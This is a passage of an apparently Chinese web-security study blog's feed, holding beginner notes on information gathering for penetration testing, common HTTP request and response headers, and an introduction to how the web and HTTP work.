        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;p&gt;在进行渗透测试之前，最重要的一步就是信息收集，在这个阶段，我们要尽可能的去搜集目标组织的信息。我们越是了解测试目标，测试的工作就越容易，在信息收集中，最重要的是收集服务器的配置信息和网站的敏感信息，其中包括域名和子域名信息，目标网站系统，CMS 指纹，目标网站真实 IP，开放的端口等，换句话说，只要是与目标网站相关的信息，我们都应该尽量收集。&lt;/p&gt;&lt;p&gt;&amp;quot;只有不努力的黑客，没有攻不破的系统&amp;quot;。&lt;br&gt;在 SRC 漏洞挖掘或渗透测试中，信息收集占很大一部分，能收集到别人收集不到的资产，就能挖到别人挖不到的洞。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="信息收集" scheme="http://avenue.cool/categories/WEB/Information-Gathering/" />
        <category term="信息收集" scheme="http://avenue.cool/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/</id>
        <title>3. WEB常见的HTTP响应头</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;1-响应报文格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-响应报文格式&#34;&gt;#&lt;/a&gt; （1）、响应报文格式：&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;lt;version&amp;gt;&amp;lt;status&amp;gt;&amp;lt;reason-phrase&amp;gt;&lt;br&gt;&amp;lt;headers&amp;gt;&lt;br&gt;&amp;lt;entity-body&amp;gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;2-响应头报文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-响应头报文&#34;&gt;#&lt;/a&gt; （2）、响应头报文：&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Accept-Ranges&lt;br&gt;表明服务器是否支持指定范围请求及哪种类型的分段请求&lt;br&gt;Accept-Ranges: bytes&lt;/p&gt;&lt;p&gt;Access-Control-Allow-Origin&lt;br&gt;配置有权限访问资源的域&lt;br&gt;Access-Control-Allow-Origin: &amp;lt;origin&amp;gt;|*&lt;/p&gt;&lt;p&gt;Allow&lt;br&gt;对某网络资源的有效的请求行为，不允许则返回 405&lt;br&gt;Allow: GET, HEAD&lt;/p&gt;&lt;p&gt;Cache-Control&lt;br&gt;告诉所有的缓存机制是否可以缓存及哪种类型&lt;br&gt;Cache-Control: no-cache&lt;/p&gt;&lt;p&gt;Content-Encoding&lt;br&gt;web 服务器支持的返回内容压缩编码类型。&lt;br&gt;Content-Encoding: gzip&lt;/p&gt;&lt;p&gt;Content-Language&lt;br&gt;响应体的语言&lt;br&gt;Content-Language: en,zh&lt;/p&gt;&lt;p&gt;Content-Length&lt;br&gt;响应体的长度&lt;br&gt;Content-Length: 348&lt;/p&gt;&lt;p&gt;Content-Location&lt;br&gt;请求资源可替代的备用的另一地址&lt;br&gt;Content-Location: /index.htm&lt;/p&gt;&lt;p&gt;Content-Type&lt;br&gt;返回内容的 MIME 类型&lt;br&gt;Content-Type: text/html; charset=utf-8&lt;/p&gt;&lt;p&gt;Date&lt;br&gt;原始服务器消息发出的时间&lt;br&gt;Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/p&gt;&lt;p&gt;ETag&lt;br&gt;请求变量的实体标签的当前值&lt;br&gt;ETag: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/p&gt;&lt;p&gt;Location&lt;br&gt;用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源&lt;br&gt;Location: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvOTQuaHRtbA==&#34;&gt;http://www.zcmhi.com/archives/94.html&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Proxy-Authenticate&lt;br&gt;它指出认证方案和可应用到代理的该 URL 上的参数&lt;br&gt;Proxy-Authenticate: Basic&lt;/p&gt;&lt;p&gt;Refresh&lt;br&gt;应用于重定向或一个新的资源被创造，在 5 秒之后重定向（由网景提出，被大部分浏览器支持）&lt;br&gt;Refresh: 5; url=http://www.zcmhi.com/archives/94.html&lt;/p&gt;&lt;p&gt;Server&lt;br&gt;web 服务器软件名称&lt;br&gt;Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)&lt;/p&gt;&lt;p&gt;Set-Cookie&lt;br&gt;设置 Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1&lt;/p&gt;&lt;p&gt;Strict-Transport-Security&lt;br&gt;设置浏览器强制使用 HTTPS 访问&lt;br&gt;max-age: x 秒的时间内 访问对应域名都使用 HTTPS 请求&lt;br&gt;includeSubDomains: 网站的子域名也启用规则&lt;br&gt;Strict-Transport-Security: max-age=1000; includeSubDomains&lt;/p&gt;&lt;p&gt;X-Frame-Options&lt;br&gt;配置页面是否能出现在 &amp;lt;frame&amp;gt;, &amp;lt;iframe&amp;gt;, &amp;lt;embed&amp;gt;, &amp;lt;object&amp;gt; 等标签中，防止点击劫持&lt;br&gt;X-Frame-Options: deny&lt;br&gt;SAMEORGIN：仅同源域名下的页面匹配时许可&lt;/p&gt;&lt;p&gt;X-XSS-Protection&lt;br&gt;配置 XSS 防护机制&lt;br&gt;X-XSS-Protection: 1; mode=block&lt;/p&gt;&lt;p&gt;HttpOnly：使 JavaScript 脚本无法获取 cookie，防止 xss 攻击。&lt;/p&gt;&lt;p&gt;X-Powered-By：可以知道 web 后端语言（但是可以修改）&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/Web%E7%AE%80%E4%BB%8B/</id>
        <title>1. WEB简介</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/Web%E7%AE%80%E4%BB%8B/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;web-简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-简介&#34;&gt;#&lt;/a&gt; Web 简介&lt;/h1&gt;&lt;h2 id=&#34;1-什么是-web&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-什么是-web&#34;&gt;#&lt;/a&gt; 1、什么是 WEB ？&lt;/h2&gt;&lt;p&gt;既然我们要学习 Web 安全，当然要简单的了解 web 的含义，Web 与现在与我们生活息息相关，通过手机或者电脑刷新闻，看个视频，或者说……(咳咳)。这其中涉及到 几个基本的点，从通信，会接触到 URL，到协议，会接触到 HTTP、HTTPS、HSTS，再到前后端的 概念，前端即 HTML，CSS，JavaScript，三剑客。后端，即处理脚本语言，比如 PHP，JAVA，python，SQL（语句）等等。&lt;/p&gt;&lt;p&gt;WEB：www 全球广域网（World Wide WEB），就是我们所说的万维网。他是一种基于超文本和 HTTP 的、全球性的、动态交互的、跨平台的分布式图形信息系统。是建立在 Internet 上的一种网络服务，为浏览者在 Internet （因特网） 上查找和浏览信息提供了图形化、易于访问的直观界面，其中的文档及超链接将 internet 上的信息节点组织成了一个互为关联的网状结构。&lt;/p&gt;&lt;h2 id=&#34;2-web-发展史&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-web-发展史&#34;&gt;#&lt;/a&gt; 2、WEB 发展史：&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;(1) 静态页面&lt;br&gt;在互联网最初开始的时候，Web 网站的主要内容是静态的，由文字和 图片组成， 制作和表现形式也是以表格为主。当时的用户行为也非常 简单，仅仅是浏览网页就行。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(2) 多媒体阶段&lt;br&gt;随着技术的不断发展，音频、视频、Flash 等多媒体技术诞生了。多媒体的加入 使得网页变得更加生动形象，网页上的交互也给用户带来了更好的体验。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(3) CGI 阶段&lt;br&gt;渐渐的，多媒体已经不能满足人们的请求，于是 CGI（Common Gateway Interface） 应运而生。CGI 定义了 Web 服务器与外部应用程序之间的通信接口标准，因此 Web 服务器可以通过 CGI 执行外部程序，让外部程序根据 Web 请求内容生成动态的内容。&lt;br&gt;在这个时候，各种编程语言如 PHP/ASP/JSP 也逐渐加入市场，基于这些语言可以 实现更加模块化的、功能更强大的应用程序。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(4) AJAX&lt;br&gt;在开始的时候，用户提交整个表单后才能获取结果，用户体验极差。于是 Ajax （Asynchronous Javascript And XML）技术逐渐流行起来，它使得应用在不更新整个页面的前提下也可以获得或更新数据。这使得 Web 应用程序更为迅捷地回 应用户动作，并避免了在网络上发送那些没有改变的信息。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(5) MVC&lt;br&gt;随着 Web 应用开发越来越标准化，出现了 MVC 等思想。MVC 是 Model/View/Control 的缩写，Model 用于封装数据和数据处理方法，视图 View 是数据的 HTML 展现， 控制器 Controller 负责响应请求，协调 Model 和 View。&lt;br&gt;Model，View 和 Controller 的分开，是一种典型的关注点分离的思想，使得代码复用性和组织性更好，Web 应用的配置性和灵活性也越来越好。而数据访问也 逐渐通过面向对象的方式来替代直接的 SQL 访问，出现了 ORM（Object Relation Mapping）的概念。&lt;br&gt;除了 MVC，类似的设计思想还有 MVP，MVVM 等。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(6) RESTful&lt;br&gt;在 CGI 时期，前后端通常是没有做严格区分的，随着解耦和的需求不断增加，前后端的概念开始变得清晰。前端主要指网站前台部分，运行在 PC 端、移动端等 浏览器上展现给用户浏览的网页，由 HTML5、CSS3、JavaScript 组成。后端主要指网站的逻辑部分，涉及数据的增删改查等。&lt;br&gt;此时，REST（Representation State Transformation）逐渐成为一种流行的 Web 架构风格。&lt;br&gt;REST 鼓励基于 URL 来组织系统功能，充分利用 HTTP 本身的语义，而不是仅仅将 HTTP 作为一种远程数据传输协议。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(7) 云服务&lt;br&gt;随着时间的发展，Web 的架构越发复杂，负载均衡、数据库分表、异地容灾、缓 存、CDN、消息队列等技术开始应用，增加了 Web 开发和运维的复杂度。同时云 服务开始逐渐发展，部署环境容器化，各个功能拆成微服务或是 Serverless 的 架构。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;2-web-工作方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-web-工作方式&#34;&gt;#&lt;/a&gt; 2、WEB 工作方式：&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;(1) 什么是 DNS 服务器？&lt;br&gt;DNS（域名系统，Domain Name System）， 它作为将域名和 IP 地址相互映射的一 个分布式数据库，能够使人更方便地访问互联网。&lt;br&gt;通俗来说，这就是一个大型的数据库，里面存放着 URL 以及与其对应的 IP 地址，类比一下就好像字典里的索引，可以根据索引找到内容。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(2) 首先我们会用浏览器访问各种资源，浏览器是客户端角色，当你输入 URL 时，浏览器会首先请求 DNS 服务器，DNS 根据你请求的 URL 返回对应的 IP 地址，接下来，浏览器会带着你请求的信息去访问该 IP 的服务器，来处理你的请求，当服务器接收到了你的请求后，会根据 HTTP 协议所带的数据，来对你的访问进行处理，这个处理就是后端过程，可能使用的是 PHP，可能是 JAVA 语言，或者其他的 ASP、ASPX，处理完成之后再将这些信息返回给客户端，客户端根据返回的数据进行呈现，呈现的网页即为前端，其中包括了 HTML,CSS,JavaScript，基本元素，一个丰富的页面就呈现在了你的眼前。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img data-src=&#34;/images/web%E5%9F%BA%E7%A1%80/Http.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;h2 id=&#34;三-http-简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-http-简介&#34;&gt;#&lt;/a&gt; 三、HTTP 简介：&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;(1) HTTP（HyperText Transfer Protocol，超文本传输协议），是因特网上应用最为广泛的一种网络传输协议，所有的 WWW 文件都必须遵守这个标准。&lt;br&gt;HTTP 是一个基于 TCP/IP 通信协议来传递数据（HTML 文件，图片文件，查询结果等）。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(2) HTTP 协议属于应用层协议，建立在 TCP 之上，HTTP 协议以客户端请求和服务端应答为标准，浏览器称为客户端，而 web 服务器称为服务器。客户端打开任意端口向服务器的 80 端口发起 http 请求，首先会发起 TCP 三次握手，是为了建立数据连接通道，通道建立成功后，进行 HTTP 数据交互。&lt;br&gt;当客户端请求的数据接收完毕后，HTTP 服务器会断开 TCP 连接，整个 HTTP 连接的过程非常短，HTTP 连接也被称为无状态的连接，无状态连接是指客户端每次向服务器发起 HTTP 请求时，每次请求都会建立一个新的 HTTP 连接，而不是在一个 HTTP 请求基础上进行所有的数据交互。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(3) 发起 HTTP 请求的内容资源由统一资源标识符（Uniform Resource Identifiers，URI）来标识，关于资源定位和标识符有三种：URI 、URN、URL，三种资源定位解释如下：&lt;br&gt;统一资源标识符（Uniform Resource identifier，URI），用来唯一标识一个资源；&lt;br&gt;统一资源定位符（uniform resource locator ， URL），是一种具体的 URI，URL 可以用来标识一个资源，而且访问获取该资源；&lt;br&gt;统一资源命名（uniform resource name，URN），通过名字来标识或识别资源；&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img data-src=&#34;/images/web%E5%9F%BA%E7%A1%80/URI.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;完整的 URL 标识格式如下：&lt;br&gt;protocol：//host [:port]/path/..../[?query-string][#anchor]&lt;br&gt;protocol // 基于某种协议，常见协议：HTTP、HTTPS、FTP、RSYNC 等；&lt;br&gt;host // 服务器的 IP 地址或者域名；&lt;br&gt;port // 服务器的端口号，如果是 HTTP，默认是 80 端口；&lt;br&gt;path // 访问资源在服务器的路径；&lt;br&gt;query-string // 传递给服务器的参数及字符串&lt;br&gt;anchor // 锚定结束；&lt;/p&gt;&lt;ul&gt;&lt;li&gt;(4) HTTP 请求报文&lt;br&gt;完整的 HTTP 请求包含以下内容，请求方法一般是 GET 和 POST，URL 即你请求的地址，协议版本一般都是 HTTP/1.1，然后配合着请求头，来访问你请求的资源，请求头有通用的，也有厂家自定义的。如果是 POST 请求，会携带请求数据。 GET 请求的数据会在 URL 处携带查询，即我们前面说到的 ？query-string 部分，POST 只不过把查询部分放在了请求报文中，即下面请求数据的部分，这样做的&lt;br&gt;目的是，较为安全的保障所请求的数据。GET 所请求的数据在 URL 中，一般大家都能看到，但是现在不管哪种请求，都或多或少的加入了编码，这样数据不进行特定的方式解码，是看不到具体数据的。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img data-src=&#34;/images/web%E5%9F%BA%E7%A1%80/Httpheader.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;(5) HTTP 请求方法：&lt;/li&gt;&lt;li&gt;GET：请求指定页面信息，并返回主体，数据插入进 URL 中进行传输。&lt;/li&gt;&lt;li&gt;POST：向指定资源提交数据进行请求，数据被放在请求数据体中传输。&lt;/li&gt;&lt;li&gt;HEAD：类似 GET 请求，但只获取头部信息，无响应体。&lt;/li&gt;&lt;li&gt;PUT：将传输数据取代指定文档传输。&lt;/li&gt;&lt;li&gt;DELETE：请求服务器删除指定页面。&lt;/li&gt;&lt;li&gt;CONNECT：与代理服务器可以进行管道方式连接&lt;/li&gt;&lt;li&gt;OPTIONS：查询针对请求 URL 指定资源支持的方法。&lt;/li&gt;&lt;li&gt;TRACE：可以对请求消息的传输路径追踪。&lt;/li&gt;&lt;li&gt;MOVE：请求服务器将指定的页面移动到另一个网络地址上&lt;/li&gt;&lt;/ul&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/</id>
        <title>2. 常见的HTTP请求头</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;常见的-http-请求头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的-http-请求头&#34;&gt;#&lt;/a&gt; 常见的 HTTP 请求头&lt;/h1&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;1-请求报文格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-请求报文格式&#34;&gt;#&lt;/a&gt; （1）、请求报文格式&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;lt;method&amp;gt;&amp;lt;request-URL&amp;gt;&amp;lt;version&amp;gt;&lt;br&gt;&amp;lt;headers&amp;gt;&lt;br&gt;&amp;lt;entity-body&amp;gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;2请求方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2请求方法&#34;&gt;#&lt;/a&gt; （2）请求方法：&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;GET：请求指定页面信息，并返回主体，数据插入进 URL 中进行传输。&lt;br&gt;POST：向指定资源提交数据进行请求，数据被放在请求数据体中传输。&lt;br&gt;HEAD：类似 GET 请求，但只获取头部信息，无响应体。&lt;br&gt;PUT：将传输数据取代指定文档传输。&lt;br&gt;DELETE：请求服务器删除指定页面。&lt;br&gt;CONNECT：与代理服务器可以进行管道方式连接。&lt;br&gt;OPTIONS：查询针对请求 URL 指定资源支持的方法。&lt;br&gt;TRACE：可以对请求消息的传输路径追踪。&lt;br&gt;MOVE：请求服务器将指定的页面移动到另一个网络地址上。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;3请求头部常见的请求头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3请求头部常见的请求头&#34;&gt;#&lt;/a&gt; （3）请求头部：（常见的请求头）&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Accept&lt;br&gt;指定客户端能够接收的内容类型&lt;br&gt;Accept: text/plain, text/html&lt;/p&gt;&lt;p&gt;Accept-Charset&lt;br&gt;浏览器可以接受的字符编码集&lt;br&gt;Accept-Charset: iso-8859-5&lt;/p&gt;&lt;p&gt;Accept-Encoding&lt;br&gt;指定浏览器可以支持的 web 服务器返回内容压缩编码类型&lt;br&gt;Accept-Encoding: compress, gzip&lt;/p&gt;&lt;p&gt;Accept-Language&lt;br&gt;浏览器可接受的语言&lt;br&gt;Accept-Language: en,zh&lt;/p&gt;&lt;p&gt;Authorization&lt;br&gt;HTTP 授权的授权证书&lt;br&gt;Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/p&gt;&lt;p&gt;Cache-Control&lt;br&gt;指定请求和响应遵循的缓存机制 Cache-Control: no-cache&lt;/p&gt;&lt;p&gt;Connection&lt;br&gt;表示是否需要持久连接 // HTTP 1.1 默认进行持久连接&lt;br&gt;Connection: close&lt;/p&gt;&lt;p&gt;Cookie&lt;br&gt;HTTP 请求发送时，会把保存在该请求域名下的所有 cookie 值一起发送给 web 服务器&lt;br&gt;Cookie: role=admin;ssid=1&lt;/p&gt;&lt;p&gt;Content-Length&lt;br&gt;请求的内容长度&lt;br&gt;Content-Length: 348&lt;/p&gt;&lt;p&gt;Content-Type&lt;br&gt;请求的与实体对应的 MIME 信息&lt;br&gt;Content-Type: application/x-www-form-urlencoded&lt;/p&gt;&lt;p&gt;Date&lt;br&gt;请求发送的日期和时间&lt;br&gt;Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/p&gt;&lt;p&gt;Host&lt;br&gt;指定请求的服务器的域名和端口号&lt;br&gt;Host: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5naXRodWIuY29t&#34;&gt;www.github.com&lt;/span&gt;&lt;/p&gt;&lt;p&gt;If-Match&lt;br&gt;只有请求内容与实体相匹配才有效&lt;br&gt;If-Match: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/p&gt;&lt;p&gt;If-Modified-Since&lt;br&gt;如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回 304 代码 (比较资源更新的时间）&lt;br&gt;If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT&lt;/p&gt;&lt;p&gt;If-None-Match&lt;br&gt;如果内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改变&lt;br&gt;If-None-Match: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/p&gt;&lt;p&gt;If-Range&lt;br&gt;如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为 Etag&lt;br&gt;If-Range: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/p&gt;&lt;p&gt;Max-Forwards&lt;br&gt;限制信息通过代理和网关传送的时间&lt;br&gt;Max-Forwards: 10&lt;/p&gt;&lt;p&gt;Proxy-Authorization&lt;br&gt;连接到代理的授权证书&lt;br&gt;Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/p&gt;&lt;p&gt;Range&lt;br&gt;只请求实体的一部分，指定范围&lt;br&gt;Range: bytes=500-999&lt;/p&gt;&lt;p&gt;Referer&lt;br&gt;先前网页的地址，当前请求网页紧随其后，即来路&lt;br&gt;Referer: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvNzEuaHRtbA==&#34;&gt;http://www.zcmhi.com/archives/71.html&lt;/span&gt;&lt;/p&gt;&lt;p&gt;User-Agent&lt;br&gt;User-Agent 的内容包含发出请求的用户信息&lt;br&gt;User-Agent: Mozilla/5.0 (Linux; X11)&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/hello-world/</id>
        <title>Hello juvenile</title>
        <link rel="alternate" href="http://avenue.cool/hello-world/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;p&gt;Welcome to My Blog, We Learn together and grow together&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <updated>2020-09-05T11:34:46.456Z</updated>
    </entry>
</feed>
